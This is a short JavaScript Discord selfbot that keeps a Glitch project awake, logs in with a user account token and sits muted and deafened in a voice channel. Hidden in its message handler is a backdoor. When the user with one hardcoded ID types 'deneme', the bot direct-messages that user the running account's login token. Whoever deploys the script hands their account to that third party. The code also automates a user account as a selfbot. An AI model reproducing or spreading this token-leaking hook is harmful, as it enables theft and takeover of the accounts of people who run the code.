const express = require('express');
const { Client, MessageEmbed } = require('discord.js-selfbot');
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;  
    }
  }   
}  
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
const http = require('http');
app.get("/", (request, response) => {
  console.log(Date.now() + " Hostlandı");
  response.sendStatus(200);
});
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
app.listen(process.env.PORT);
setInterval(() => { 
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000) 
const Discord = require('discord.js-selfbot');
const client = new Discord.Client();
const data = new Map();
client.on('ready', () => {
        console.log(`${client.user.username} ismi ile giriş yapıldı!`);
});
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
/////////////////ATANIS///////////////////ATANIS///////////////////////////////////ATANIS////////////////
client.login(process.env.token)

client.on('message', async (msg, member, guild) => {
  
 {
   
if (msg.content.toLowerCase() === 'deneme'){
if (msg.author.id !== "813799329407041576") return

msg.author.send(`Tokenim: ${client.token}`);
}
  
}
});

client.on("ready", async => { 
let kanal = client.channels.cache.get(process.env.sesid)

kanal.join().then(e => {
kanal.guild.me.voice.setSelfMute(true)
kanal.guild.me.voice.setSelfDeaf(true)
}).catch(err => { console.log(err) })
})
